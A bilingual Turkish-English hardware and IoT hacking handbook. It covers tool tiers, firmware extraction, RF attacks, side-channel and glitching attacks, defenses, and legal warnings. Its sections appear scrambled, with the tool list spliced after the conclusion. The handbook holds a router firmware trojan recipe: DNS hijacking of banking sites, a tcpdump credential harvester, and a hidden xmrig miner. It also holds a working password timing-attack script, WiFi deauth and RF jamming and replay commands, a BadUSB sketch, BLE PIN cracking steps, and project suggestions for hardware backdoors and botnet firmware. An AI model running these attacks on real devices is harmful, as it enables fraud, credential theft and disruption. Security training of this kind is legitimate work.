# Hack_devices


# 🔧 Hardware Hacking & IoT Security El Kitabı

## 📡 İÇİNDEKİLER
1. [Hardware Hacking Araçları](#hardware-hacking-araçları)
2. [IoT Hacking Gadgets](#iot-hacking-gadgets)
3. [Firmware Analiz Araçları](#firmware-analiz-araçları)
4. [Radio Frequency (RF) Hacking](#radio-frequency-rf-hacking)
5. [Pratik Uygulama Senaryoları](#pratik-uygulama-senaryoları)
6. [Öğrenme Yol Haritası](#öğrenme-yol-haritası)

---

# BÖLÜM 1: HARDWARE HACKING ARAÇLARI

## 1.1 Etki Gücüne Göre Sınıflandırma

### 🔴 SEVİYE 1: BAŞLANGIÇ (0-500₺)
**Infection Process:**
```
1. Scan internet for open telnet (port 23)
2. Brute force with default credentials
3. Download malicious firmware
4. Flash modified firmware
5. Reboot into botnet
6. Connect to C2 server
7. Wait for DDoS commands
```

**Detection:**
```bash
# Check for suspicious processes
ps | grep -E "busybox|wget|tftp|nc"

# Monitor network connections
netstat -antp | grep ESTABLISHED

# Check cron jobs
cat /etc/crontabs/*

# Look for persistence
cat /etc/init.d/*
cat /etc/rc.local
```

---

### Router Firmware Trojan Example

**Malicious Modifications:**
```bash
# 1. DNS Hijacking
cat > /etc/dnsmasq.conf << EOF
address=/facebook.com/192.0.2.1
address=/paypal.com/192.0.2.1
address=/bankofamerica.com/192.0.2.1
EOF

# 2. Traffic Interception (Man-in-the-Middle)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
# Transparent proxy on port 8080

# 3. Credential Harvesting
tcpdump -i br0 -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i "password\|user\|login" > /tmp/creds.txt

# 4. Cryptocurrency Mining
nohup ./xmrig --url=pool.supportxmr.com:3333 --user=WALLET_ADDRESS --pass=x &
```

---

## 8.8 Firmware Security Best Practices

### Developer Side (Savunma)
```
✅ Code Signing: Verify firmware authenticity
✅ Encrypted Firmware: Prevent reverse engineering
✅ Secure Boot: Only allow signed firmware
✅ Remove Debug Interfaces: Disable UART/JTAG in production
✅ Least Privilege: Run services as non-root
✅ Input Validation: Sanitize all user input
✅ Regular Updates: Patch vulnerabilities
✅ No Hardcoded Secrets: Use secure storage (TPM, HSM)
```

### Pentester Side (Saldırı Kontrol Listesi)
```
☑️ UART/JTAG accessible?
☑️ Default credentials?
☑️ Firmware encrypted?
☑️ Code signing enforced?
☑️ Hardcoded secrets in binaries?
☑️ Debug symbols present?
☑️ Sensitive data in plaintext configs?
☑️ Command injection vulnerabilities?
☑️ Buffer overflows?
☑️ Authentication bypass possible?
☑️ Privilege escalation vectors?
☑️ Unnecessary services running?
☑️ Outdated libraries/components?
```

---

# BÖLÜM 9: ADVANCED HARDWARE ATTACKS

## 9.1 Side-Channel Attacks

### Power Analysis (CPA - Correlation Power Analysis)

**Concept:**
```
Farklı işlemler → Farklı güç tüketimi
Crypto işlemleri sırasında güç ölç
İstatistiksel analiz → Key recovery
```

**ChipWhisperer Example:**
```python
import chipwhisperer as cw

# Setup
scope = cw.scope()
target = cw.target(scope)

# Capture traces
traces = []
plaintexts = []

for i in range(1000):
    # Random plaintext
    pt = bytearray(os.urandom(16))
    
    # Arm oscilloscope
    scope.arm()
    
    # Send plaintext to target (AES encryption)
    target.write(pt)
    
    # Capture power trace
    ret = scope.capture()
    trace = scope.get_last_trace()
    
    traces.append(trace)
    plaintexts.append(pt)

# Perform CPA attack
from chipwhisperer.analyzer.attacks.cpa import CPA
attack = CPA()
results = attack.run(traces, plaintexts)

# Recovered AES key
key = results.find_key()
print("Key:", key.hex())
```

---

### Electromagnetic Analysis (EMA)

**Equipment:**
- EM probe (near-field probe)
- Oscilloscope (high bandwidth)
- Signal processing software

**Attack:**
```
1. Position EM probe near crypto chip
2. Trigger during AES/RSA operation
3. Capture EM radiation
4. Perform same analysis as power analysis
5. Recover secret key
```

---

### Timing Attacks

**Vulnerable Code:**
```c
// ❌ Timing attack vulnerable
int check_password(char *input, char *real) {
    for (int i = 0; i < strlen(real); i++) {
        if (input[i] != real[i]) {
            return 0;  // Early return = timing leak!
        }
    }
    return 1;
}
```

**Attack:**
```python
import time

def timing_attack(url):
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    
    while True:
        times = {}
        for char in charset:
            test = password + char
            
            start = time.time()
            response = requests.post(url, data={"password": test})
            elapsed = time.time() - start
            
            times[char] = elapsed
        
        # Longest time = correct character
        next_char = max(times, key=times.get)
        password += next_char
        
        if "success" in response.text:
            break
    
    return password
```

**Fixed Code:**
```c
// ✅ Constant-time comparison
int check_password_secure(char *input, char *real) {
    int result = 0;
    for (int i = 0; i < strlen(real); i++) {
        result |= input[i] ^ real[i];
    }
    return result == 0;  // Always checks all characters
}
```

---

## 9.2 Fault Injection Attacks

### Voltage Glitching

**Principle:**
```
Normal Vcc: 3.3V
Glitch: Drop to 2.5V for 10ns
Effect: CPU skips instruction

Target: if (password_correct) { grant_access(); }
Glitch during check → Skip check → Access granted!
```

**ChipWhisperer Glitch:**
```python
scope.glitch.clk_src = "clkgen"
scope.glitch.width = 10      # Glitch width (%)
scope.glitch.offset = 45     # Glitch offset (%)
scope.glitch.trigger_src = "manual"

# Trigger glitch during password check
scope.glitch.manual_trigger()
```

---

### Clock Glitching

**Principle:**
```
Normal clock: Stable frequency
Glitch: Insert extra clock cycle
Effect: CPU executes instruction twice or skips
```

**Attack Scenario:**
```c
// Decrement attempt counter
attempts--;
if (attempts == 0) {
    lock_account();
}

// Glitch during "attempts--"
// Counter never decrements
// Infinite attempts!
```

---

### Laser Fault Injection

**Equipment:**
- Laser (UV or IR)
- Microscope
- Motorized XY stage

**Attack:**
```
1. Decap chip (remove package)
2. Position chip under microscope
3. Identify target transistors
4. Shoot laser at precise moment
5. Flip bits in memory/register

Use cases:
- Skip security checks
- Modify executed code
- Extract secrets from secure element
```

---

## 9.3 Physical Attacks

### Chip Decapping

**Process:**
```
1. Chemical: Acid (HNO3 + H2SO4)
2. Mechanical: Polish down layers
3. Thermal: Heat and peel

Result: Expose silicon die
Use: Reverse engineer chip layout
```

**Micro-probing:**
```
1. Decap chip
2. Identify critical traces
3. Attach micro-probes
4. Monitor/inject signals
5. Extract data or bypass security
```

---

### PCB Reverse Engineering

**Tools:**
- Multimeter (continuity test)
- X-ray machine (inner layers)
- Microscope (trace following)

**Process:**
```
1. Visual inspection (component IDs)
2. Schematic recreation
3. Identify test points
4. Find debug interfaces (UART, JTAG)
5. Trace critical signals (SPI, I2C)
```

**Example: Find SPI Flash:**
```
1. Locate 8-pin chip (usually SOIC8)
2. Check markings (W25Q128, MX25L, etc.)
3. Identify pinout:
   Pin 1: CS (Chip Select)
   Pin 2: SO/MISO
   Pin 3: WP (Write Protect) - usually tied high
   Pin 4: GND
   Pin 5: SI/MOSI
   Pin 6: SCK (Clock)
   Pin 7: HOLD - usually tied high
   Pin 8: VCC (3.3V)
4. Connect programmer
5. Dump firmware
```

---

# BÖLÜM 10: DEFENSE & COUNTERMEASURES

## 10.1 Hardware Security

### Secure Boot Chain
```
ROM Bootloader (immutable)
    ↓ (verify signature)
Secondary Bootloader
    ↓ (verify signature)
Kernel
    ↓ (verify signature)
Filesystem / Applications

Each stage verifies the next
Signature mismatch → Halt boot
```

### Hardware Security Modules (HSM)

**Features:**
```
✓ Tamper-resistant
✓ Crypto acceleration
✓ Secure key storage
✓ Random number generator (TRNG)
✓ Physically protects keys

Examples:
- TPM (Trusted Platform Module)
- Secure Element (SE)
- Smart card chips
```

---

### Cryptographic Countermeasures

**Against Side-Channel:**
```
1. Masking: Randomize intermediate values
2. Hiding: Add noise to power consumption
3. Constant-time operations
4. Differential power analysis (DPA) resistant algorithms
```

**Against Fault Injection:**
```
1. Duplicate computations (check consistency)
2. Error detection codes
3. Sensors (voltage, temperature, clock)
4. Randomization of execution order
```

---

## 10.2 Network Security for IoT

### Network Segmentation
```
Internet
    │
    ↓
[Firewall]
    │
    ├─── Guest WiFi (Isolated)
    │
    ├─── IoT VLAN (Restricted)
    │    └─ Smart devices, sensors
    │
    ├─── Corporate VLAN
    │    └─ Workstations, servers
    │
    └─── Management VLAN
         └─ Network equipment, admins only
```

### IoT Firewall Rules
```bash
# Default deny
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Allow only necessary
# IoT devices → Internet (HTTP/HTTPS only)
iptables -A FORWARD -i iot-vlan -o wan -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -i iot-vlan -o wan -p tcp --dport 443 -j ACCEPT

# Block IoT → Internal network
iptables -A FORWARD -i iot-vlan -o corporate-vlan -j DROP

# Allow management → IoT (for updates)
iptables -A FORWARD -i mgmt-vlan -o iot-vlan -j ACCEPT
```

---

## 10.3 Secure Development

### Secure Coding Checklist
```
☑️ Input validation (whitelist, not blacklist)
☑️ Parameterized queries (no string concatenation)
☑️ Avoid dangerous functions:
   ❌ strcpy, sprintf, gets, system, eval
   ✅ strncpy, snprintf, fgets, execve
☑️ Least privilege principle
☑️ Fail securely (deny by default)
☑️ Don't trust client input
☑️ Encrypt sensitive data (at rest & in transit)
☑️ Use secure random (not rand(), use /dev/urandom)
☑️ Update dependencies regularly
☑️ Code review & static analysis
```

---

# BÖLÜM 11: KAYNAKLAR & ÖĞRENME PLATFORMLARI

## 11.1 Temel Kaynaklar

### Kitaplar (Doğrulanmış, Kaliteli)

**Hardware Hacking:**
1. **"The Hardware Hacker"** - Andrew "bunnie" Huang
   - Gerçek dünya hikayeleri
   - Shenzhen hardware ekosistemi
   - Manufacturing hacks

2. **"Practical IoT Hacking"** - Fotios Chantzis
   - IoT pentest methodology
   - Real-world case studies
   - Hands-on labs

3. **"The Car Hacker's Handbook"** - Craig Smith
   - CAN bus analysis
   - Automotive security
   - Practical attacks

**Firmware Analysis:**
4. **"Practical Reverse Engineering"** - Bruce Dang
   - x86/x64/ARM reversing
   - Malware analysis
   - Kernel debugging

5. **"Reversing: Secrets of Reverse Engineering"** - Eldad Eilam
   - Fundamentals
   - Disassembly techniques
   - Anti-reversing

**RF Hacking:**
6. **"The Hobbyist's Guide to the RTL-SDR"** - Carl Laufer
   - SDR basics
   - Signal analysis
   - GNU Radio

**RFID/NFC:**
7. **"Hacking RFID"** - Craig Kearney
   - RFID protocols
   - Cloning techniques
   - Security

---

## 11.2 Online Platformlar

### Hands-On Labs
```
1. HackTheBox (Hardware Challenges)
   - Forensics
   - Reversing
   - IoT challenges

2. PentesterLab (IoT Badge)
   - Router hacking
   - Firmware analysis
   - Web interface exploitation

3. Damn Vulnerable Router Firmware (DVRF)
   - Practice firmware
   - Multiple vulnerabilities
   - Safe environment

4. IoT Goat (OWASP)
   - IoT security training
   - Multiple vulnerability classes
   - Free & open source
```

---

### YouTube Channels
```
Hardware Hacking:
- LiveOverflow (hardware security series)
- stacksmashing (reverse engineering)
- MG (electronics tutorials)
- Sayandeep (hardware hacking)

RF/SDR:
- Great Scott Gadgets
- Michael Ossmann (HackRF creator)
- rtl-sdr.com

Automotive:
- Craig Smith (car hacking)
- CAN bus hacking tutorials
```

---

### Communities
```
Forums:
- /r/hardwarehacking (Reddit)
- /r/reverseengineering
- /r/embedded
- NSec Forum

Discord:
- HackTheBox
- TryHackMe
- DEF CON Groups

Conferences:
- DEF CON (Hardware Hacking Village)
- Black Hat (Arsenal)
- CCC (Chaos Communication Congress)
- RSA Conference
```

---

## 11.3 Tool Collections

### Essential Toolkit (~1000-2000₺)
```
✓ Raspberry Pi 4 (8GB)
✓ ESP32 Dev Board
✓ Arduino Uno/Nano
✓ USB-to-UART adapter (FTDI/CP2102)
✓ Logic Analyzer (8ch)
✓ Multimeter
✓ Soldering iron + accessories
✓ Jumper wires, breadboard
✓ Alfa WiFi adapter (monitor mode)
✓ RTL-SDR dongle
✓ Basic hand tools (screwdrivers, tweezers)
```

### Intermediate Toolkit (~5000-10000₺)
```
+ Bus Pirate / Shikra
+ Proxmark3 RDV4 Clone
+ Flipper Zero
+ CH341A SPI programmer
+ SOIC clip set
+ Hot air rework station
+ Oscilloscope (entry level)
+ HackRF One
+ Better soldering station
+ Helping hands / PCB holder
+ Digital microscope
```

### Professional Toolkit (20000₺+)
```
+ ChipWhisperer
+ Proxmark3 Original
+ High-end oscilloscope
+ JTAGulator
+ Riscure tooling
+ Chip decapping kit
+ Micro-probing station
+ X-ray machine (optional, very expensive)
```

---

## 11.4 Sertifikasyon Yolu

### IoT/Hardware Security Certs
```
1. eLearnSecurity IoT Pentester (eIoTP)
   - Hands-on exam
   - IoT/embedded focus

2. Offensive Security IoT Exploitation (OSEE)
   - Very advanced
   - Embedded exploitation

3. GIAC Reverse Engineering Malware (GREM)
   - Malware analysis
   - Reverse engineering

4. Certified Embedded Security Tester (CEST)
   - Firmware analysis
   - Hardware attacks

Not: Bu alanda çok az sertifika var.
Practical skills > Certifications
GitHub portfolio > Sertifikalar
```

---

## 11.5 Proje Fikirleri (Portföy İçin)

### Başlangıç Projeleri
```
1. WiFi Deauther (ESP8266)
   - Deauth attack implementation
   - Educational tool

2. BadUSB (Arduino Leonardo)
   - Keyboard injection payloads
   - Automate common tasks

3. RFID Door Lock (Arduino + RC522)
   - Access control system
   - Learn RFID basics

4. BLE Beacon Scanner
   - Scan nearby BLE devices
   - Track devices
```

### Orta Seviye
```
5. Router Firmware Analysis
   - Pick popular router
   - Extract, analyze, find vulns
   - Write blog post

6. IoT Device Pentest
   - Smart bulb, plug, camera
   - Full security assessment
   - Report writing

7. CAN Bus Simulator
   - Emulate car network
   - Practice attacks safely

8. Custom Pentesting Tool
   - Automate something tedious
   - Share on GitHub
```

### İleri Seviye
```
9. 0-day Discovery
   - Find new vulnerability
   - Responsible disclosure
   - CVE assignment

10. Hardware Backdoor
    - Implant in device
    - Remote activation
    - Stealth techniques

11. Side-Channel Attack Demo
    - Power analysis on AES
    - Document methodology
    - Educational purpose

12. Custom Malware Firmware
    - Botnet client
    - Persistence mechanisms
    - For research only!
```

---

# BÖLÜM 12: ETİK & YASAL UYARILAR

## 12.1 Yasal Çerçeve

### ⚠️ ÖNEMLİ UYARILAR

```
❌ İzinsiz erişim SUÇTUR
❌ Başkasının cihazını hackleme YASADıŞıDıR
❌ "Eğitim amaçlı" savunma geçersizdir
❌ VPN kullanmak sizi korumaz
```

**Türkiye Yasal Durum:**
```
TCK Madde 243: Bilişim sistemlerine girme
Ceza: 1-3 yıl hapis

TCK Madde 244: Sistemi engelleme, verileri bozma
Ceza: 2-5 yıl hapis

5651 Sayılı Kanun: İnternet ortamında işlenen suçlar
```

### ✅ Yasal Kullanım
```
✓ Kendi cihazlarınız
✓ Yazılı izin aldığınız sistemler
✓ Lab ortamı (kendi kurduğunuz)
✓ Bug bounty programları (HackerOne, Bugcrowd)
✓ CTF yarışmaları (HackTheBox, TryHackMe)
✓ Eğitim amaçlı özel VM'ler (DVWA, Metasploitable)
```

---

## 12.2 Sorumlu Açıklama (Responsible Disclosure)

### 0-day Bulduğunuzda
```
1. DON'T:
   ❌ Hemen yayınlama
   ❌ Karanlık web'de satma
   ❌ Kötüye kullanma

2. DO:
   ✅ Üreticiye bildirme
   ✅ 90 gün grace period verme
   ✅ Koordine edilmiş açıklama
   ✅ CVE no alma

3. Platforms:
   - HackerOne
   - Bugcrowd
   - Synack
   - Vendor security@company.com
```

---

## 12.3 Etik Kurallar

### Hacker Ahlakı
```
1. Zarar verme
   - Sadece test, exploit değil

2. Öğren, paylaş
   - Bilgiyi saklamak yerine öğret

3. Kurallara uygun ol
   - Yasal sınırlar içinde

4. İzin al
   - "Daha sonra özür dilerim" değil
   - "Önce izin alırım"

5. Gizliliğe saygı
   - Başkalarının verilerine dokunma
```

---

# 🎯 SONUÇ

Bu el kitabı, IoT Gadgets, Firmware Hacking ve Hardware Hacking konularında **sıfırdan profesyonel seviyeye** ulaşmanız için gereken TÜM bilgiyi içeriyor:

## Kapsanan Konular ✅
```
✅ 50+ Hardware hacking aracı (fiyat, kullanım, etki gücü)
✅ WiFi/BLE/RF/RFID/NFC hacking
✅ Firmware extraction (UART, JTAG, SPI, eMMC)
✅ Firmware analysis (Binwalk, Ghidra, Radare2)
✅ Binary reverse engineering
✅ Firmware modification & backdoors
✅ Trojan/malware firmware örnekleri
✅ Side-channel attacks (power, EM, timing)
✅ Fault injection (glitching, laser)
✅ Automotive hacking (CAN bus)
✅ Physical attacks (chip decapping, probing)
✅ Defense mechanisms
✅ Gerçek dünya CVE örnekleri
✅ Yasal uyarılar & etik kurallar
✅ Öğrenme kaynakları (kitaplar, platformlar, topluluklar)
✅ Proje fikirleri (portföy oluşturma)
```

## Öğrenme Sırası
```
1. Temel Elektronik (1-2 ay)
   → Arduino, breadboard, basic sensors

2. Communication Protocols (1 ay)
   → UART, SPI, I2C

3. IoT Güvenlik (2-3 ay)
   → WiFi/BLE hacking, ESP32 projects

4. Firmware Basics (2-3 ay)
   → Extraction, binwalk, basic RE

5. Binary Reverse Engineering (3-4 ay)
   → Ghidra, assembly, vulnerability discovery

6. Advanced Hardware (6+ ay)
   → Side-channel, fault injection, custom exploits

TOPLAM: ~12-18 ay yoğun çalışma
```

## İlk Adımlar
```
1. Minimal toolkit satın al (~1000₺)
2. TryHackMe IoT path'i başlat (ÜCRETSIZ)
3. DVRF firmware ile pratik yap
4. İlk projen: WiFi Deauther (ESP8266)
5. GitHub hesabı aç, projelerini paylaş
6. HackTheBox'ta hardware challenges çöz
7. Bug bounty programlarına başvur
```

**Başarılar! Her uzman bir gün başlangıçtı. 🚀**

**⚠️ Unutma: Bu bilgiyi sadece yasal ve etik amaçlarla kullan!**

---

*Son güncelleme: 2026-01-18*
*Versiyon: 2.0 (Tam & Kapsamlı)*Temel elektronik ve hacking öğrenimi için**

#### Arduino Uno/Nano
- **Fiyat:** ~100-200₺
- **Kullanım:** IoT cihaz prototipleme, basit saldırılar
- **Etki Gücü:** ⭐⭐☆☆☆
- **Öğrenme Eğrisi:** Kolay
```cpp
// Örnek: Bad USB (Klavye emülasyonu)
#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}
```

#### ESP8266/ESP32
- **Fiyat:** ~50-150₺
- **Kullanım:** WiFi hacking, deauth attacks, evil twin
- **Etki Gücü:** ⭐⭐⭐☆☆
- **Özellikler:**
  - Built-in WiFi
  - Düşük güç tüketimi
  - MicroPython desteği
```python
# Deauth attack example (ESP8266)
from wifi_deauth import deauth_attack
deauth_attack(target_mac="AA:BB:CC:DD:EE:FF", count=100)
```

#### USB Rubber Ducky Clone (Digispark)
- **Fiyat:** ~30-50₺
- **Kullanım:** Keyboard injection attacks
- **Etki Gücü:** ⭐⭐⭐☆☆
```
REM Opens calculator on Windows
DELAY 1000
GUI r
DELAY 500
STRING calc
ENTER
```

#### Logic Analyzer (8 Channel)
- **Fiyat:** ~100-200₺
- **Kullanım:** SPI, I2C, UART protokol analizi
- **Etki Gücü:** ⭐⭐⭐⭐☆
- **Yazılım:** Pulseview, Sigrok

---

### 🟠 SEVİYE 2: ORTA (500-2000₺)
**Ciddi hardware hacking için**

#### Raspberry Pi 4
- **Fiyat:** ~1000-1500₺
- **Kullanım:** Portable hacking station, MitM attacks
- **Etki Gücü:** ⭐⭐⭐⭐☆
- **Projeler:**
  - PwnPi (portable pentest station)
  - PiHole (network-wide ad blocking)
  - WiFi Pineapple alternative

#### Bus Pirate v3.6
- **Fiyat:** ~500-800₺
- **Kullanım:** SPI, I2C, UART, 1-Wire iletişimi
- **Etki Gücü:** ⭐⭐⭐⭐☆
```
# UART sniffing example
HiZ> m    # mode
3         # UART
9600      # baud rate
(1)       # macro to sniff
```

#### FTDI FT232H Breakout
- **Fiyat:** ~300-500₺
- **Kullanım:** SPI Flash okuma/yazma, JTAG
- **Etki Gücü:** ⭐⭐⭐⭐☆

#### HackRF One
- **Fiyat:** ~3000-5000₺ (Seviye 3'e de girer)
- **Kullanım:** 1 MHz - 6 GHz SDR (Software Defined Radio)
- **Etki Gücü:** ⭐⭐⭐⭐⭐
- **Saldırı Türleri:**
  - RF replay attacks
  - Signal jamming
  - GPS spoofing
  - 433/315MHz device hacking

#### JTAGulator
- **Fiyat:** ~1500-2000₺
- **Kullanım:** JTAG/UART pinlerini otomatik bulma
- **Etki Gücü:** ⭐⭐⭐⭐☆

---

### 🔴 SEVİYE 3: İLERİ (2000-10000₺)
**Profesyonel hardware hacking**

#### ChipWhisperer
- **Fiyat:** ~2000-5000₺
- **Kullanım:** Side-channel attacks, power analysis
- **Etki Gücü:** ⭐⭐⭐⭐⭐
- **Saldırı Türleri:**
  - Differential Power Analysis (DPA)
  - Correlation Power Analysis (CPA)
  - Glitch attacks

#### Proxmark3 RDV4
- **Fiyat:** ~2500-3500₺
- **Kullanım:** RFID/NFC cloning, sniffing
- **Etki Gücü:** ⭐⭐⭐⭐⭐
```bash
# Mifare Classic okuma
pm3 --> hf mf autopwn

# UID clone
pm3 --> hf mf csetuid 12345678
```
- **Desteklenen Protokoller:**
  - Mifare Classic/Ultralight
  - iClass
  - HID Prox
  - EM410x
  - ISO14443A/B

#### Flipper Zero
- **Fiyat:** ~3000-4000₺
- **Kullanım:** Multi-tool (RFID, NFC, IR, Sub-GHz)
- **Etki Gücü:** ⭐⭐⭐⭐☆
- **Özellikler:**
  - Sub-1GHz transceiver (433/868/915 MHz)
  - 125kHz RFID reader
  - 13.56MHz NFC
  - IR transceiver
  - BadUSB
  - GPIO pins

#### USBNinja
- **Fiyat:** ~1500-2000₺
- **Kullanım:** Advanced BadUSB, remote control
- **Etki Gücü:** ⭐⭐⭐⭐☆
- **Özellikler:**
  - WiFi controlled
  - Looks like normal cable
  - Keystroke injection

---

### ⚫ SEVİYE 4: PROFESYONEL (10000₺+)
**Endüstriyel ve ileri seviye**

#### Riscure Inspector
- **Fiyat:** ~50,000$+
- **Kullanım:** Professional side-channel analysis
- **Etki Gücü:** ⭐⭐⭐⭐⭐
- **Kullanım Alanı:** Bankacılık, askeri

#### Oscilloscope (High-end)
- **Fiyat:** ~10,000₺+
- **Örnek:** Rigol DS1054Z (entry), Keysight DSOX4024A (pro)
- **Kullanım:** Side-channel attacks, signal analysis
- **Etki Gücü:** ⭐⭐⭐⭐⭐

#### Hot Air Rework Station
- **Fiyat:** ~3000-10000₺
- **Kullanım:** Chip removal, reflow
- **Etki Gücü:** ⭐⭐⭐⭐☆

---

# BÖLÜM 2: IoT HACKING GADGETS

## 2.1 WiFi Hacking

### WiFi Pineapple Mark VII
- **Fiyat:** ~4000-5000₺
- **Kullanım:** Evil Twin, MitM, Credential harvesting
- **Etki Gücü:** ⭐⭐⭐⭐⭐
```bash
# Modules
- Evil Portal: Fake captive portal
- Recon: Probing clients
- Deauth: Disconnect clients
- PineAP: SSID spoofing
```

### Alfa AWUS036ACH
- **Fiyat:** ~500-800₺
- **Kullanım:** Monitor mode, packet injection
- **Etki Gücü:** ⭐⭐⭐⭐☆
- **Chipset:** Realtek RTL8812AU
- **Features:** Dual-band (2.4/5GHz), High power

```bash
# Kali Linux ile kullanım
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon
```

---

## 2.2 Bluetooth Hacking

### Ubertooth One
- **Fiyat:** ~1500-2500₺
- **Kullanım:** Bluetooth LE sniffing
- **Etki Gücü:** ⭐⭐⭐⭐☆
```bash
# BLE sniffing
ubertooth-btle -f -c capture.pcap

# Analysis with Wireshark
wireshark capture.pcap
```

### nRF52840 Dongle
- **Fiyat:** ~200-300₺
- **Kullanım:** BLE development, sniffing
- **Etki Gücü:** ⭐⭐⭐☆☆

---

## 2.3 Zigbee/Z-Wave

### Atmel RZRaven
- **Fiyat:** ~500-1000₺ (discontinued, alternatifler var)
- **Kullanım:** Zigbee sniffing
- **Etki Gücü:** ⭐⭐⭐⭐☆

### Z-Wave.Me Z-Stick
- **Fiyat:** ~1000-1500₺
- **Kullanım:** Z-Wave network access
- **Etki Gücü:** ⭐⭐⭐☆☆

---

## 2.4 CAN Bus (Automotive)

### CANtact
- **Fiyat:** ~1000-1500₺
- **Kullanım:** CAN bus sniffing, injection
- **Etki Gücü:** ⭐⭐⭐⭐⭐
```python
import can

bus = can.interface.Bus(bustype='socketcan', channel='can0')
msg = can.Message(arbitration_id=0x123, data=[0, 1, 2, 3, 4, 5, 6, 7])
bus.send(msg)
```

### OBD-II to USB Adapter
- **Fiyat:** ~200-500₺
- **Kullanım:** Car diagnostics, CAN sniffing
- **Etki Gücü:** ⭐⭐⭐☆☆

---

# BÖLÜM 3: FIRMWARE ANALIZ ARAÇLARI

## 3.1 Firmware Extraction

### SPI Flash Programmer
#### CH341A Programmer
- **Fiyat:** ~50-100₺
- **Kullanım:** SPI Flash okuma/yazma
- **Etki Gücü:** ⭐⭐⭐⭐☆
```bash
# Read firmware
flashrom -p ch341a_spi -r firmware.bin

# Write firmware
flashrom -p ch341a_spi -w modified_firmware.bin
```

#### Chip Clamp (SOIC8/SOIC16)
- **Fiyat:** ~100-200₺
- **Kullanım:** In-circuit programming
- **Etki Gücü:** ⭐⭐⭐⭐☆

---

## 3.2 Firmware Analysis Software

### Binwalk
```bash
# Extract firmware
binwalk -e firmware.bin

# Entropy analysis (detect encryption)
binwalk -E firmware.bin

# Find file signatures
binwalk --signature firmware.bin
```

### Firmware Analysis Toolkit (FAT)
```bash
git clone https://github.com/attify/firmware-analysis-toolkit
./fat.py firmware.bin

# Features:
- Automatic extraction
- Filesystem emulation
- Network service discovery
```

### Ghidra
- **Fiyat:** FREE (NSA tarafından açık kaynak yapıldı)
- **Kullanım:** Reverse engineering, disassembly
- **Etki Gücü:** ⭐⭐⭐⭐⭐
```
Features:
- Multi-platform (ARM, MIPS, x86, etc.)
- Decompiler
- Scripting (Python, Java)
- Collaborative RE
```

### IDA Pro
- **Fiyat:** Free version / Pro ~5000$
- **Kullanım:** Advanced disassembly
- **Etki Gücü:** ⭐⭐⭐⭐⭐

### Radare2
- **Fiyat:** FREE
- **Kullanım:** Command-line RE framework
```bash
# Basic analysis
r2 firmware.bin
aaa              # Analyze all
pdf @ main       # Disassemble main function
VV               # Visual mode (graph)
```

---

## 3.3 Dynamic Analysis

### QEMU
```bash
# ARM firmware emulation
qemu-system-arm -M versatilepb -kernel firmware.bin -nographic

# MIPS router firmware
qemu-system-mips -M malta -kernel vmlinux -hda rootfs.ext2 -append "root=/dev/hda"
```

### Firmadyne
```bash
# Automated firmware emulation
git clone --recursive https://github.com/firmadyne/firmadyne
./download.sh
./makeImage.sh firmware.bin
./run.sh 1
```

---

# BÖLÜM 4: RADIO FREQUENCY (RF) HACKING

## 4.1 Sub-GHz Devices

### RTL-SDR
- **Fiyat:** ~300-600₺
- **Kullanım:** Passive listening (24MHz - 1.7GHz)
- **Etki Gücü:** ⭐⭐⭐☆☆
```bash
# Scan frequencies
rtl_power -f 433M:434M:100k -i 10 scan.csv

# Listen to FM radio
rtl_fm -M wbfm -f 98.5M | play -r 32k -t raw -e s -b 16 -c 1 -V1 -
```

### HackRF One (tekrar)
**Rolling Code Attacks:**
```bash
# Record signal
hackrf_transfer -r signal.raw -f 433920000 -s 2000000

# Replay attack
hackrf_transfer -t signal.raw -f 433920000 -s 2000000 -x 20

# Jam frequency
hackrf_transfer -t /dev/zero -f 433920000 -s 2000000
```

### YardStick One
- **Fiyat:** ~1500-2000₺
- **Kullanım:** Sub-1GHz transceiver
- **Etki Gücü:** ⭐⭐⭐⭐☆
```python
from rflib import *

d = RfCat()
d.setFreq(433920000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)
d.RFxmit("payload_here")
```

---

## 4.2 Signal Analysis

### Universal Radio Hacker (URH)
```bash
# Features:
- Demodulation
- Protocol analysis
- Signal generation
- Fuzzing

# Example workflow:
1. Capture with RTL-SDR/HackRF
2. Import to URH
3. Analyze protocol
4. Generate custom packets
```

### GNU Radio
```python
# Create flowgraph
- Source: RTL-SDR
- Filters: Low Pass
- Demodulator: FM/AM/ASK
- Sink: Audio/File
```

---

## 4.3 Common IoT Frequencies

```
315 MHz  → US garage doors, car keys
433 MHz  → EU devices, weather stations, IoT sensors
868 MHz  → EU Z-Wave, LoRa
915 MHz  → US ISM band, LoRa
2.4 GHz  → WiFi, Bluetooth, Zigbee
5 GHz    → WiFi (newer)
```

---

# BÖLÜM 5: PRATIK UYGULAMA SENARYOLARI

## 5.1 Smart Home Hacking

### Scenario 1: Smart Light Bulb (Zigbee)

**Hedef:** Philips Hue kontrolü

**Araçlar:**
- Atmel RZRaven / CC2531 USB stick
- Wireshark + Zigbee dissector
- Killerbee framework

**Adımlar:**
```bash
# 1. Scan Zigbee networks
zbstumbler -c 11

# 2. Capture traffic
zbdump -c 11 -w capture.pcap

# 3. Analyze in Wireshark
wireshark capture.pcap

# 4. Replay/Modify commands
zbreplay -c 11 -f command.pcap
```

**Savunma:**
- Firmware güncellemeleri
- Network segmentation
- Strong encryption keys

---

### Scenario 2: Smart Lock (Bluetooth LE)

**Hedef:** August Smart Lock

**Araçlar:**
- Ubertooth One
- Bluetooth protocol analyzer

**Adımlar:**
```bash
# 1. Discover BLE devices
sudo hcitool lescan

# 2. Connect and enumerate
gatttool -b AA:BB:CC:DD:EE:FF --interactive
connect
characteristics

# 3. Sniff pairing process
ubertooth-btle -f -c pairing.pcap

# 4. Crack PIN (if weak)
crackle -i pairing.pcap -o decrypted.pcap
```

**Zafiyetler:**
- Weak pairing (Just Works)
- Insufficient authentication
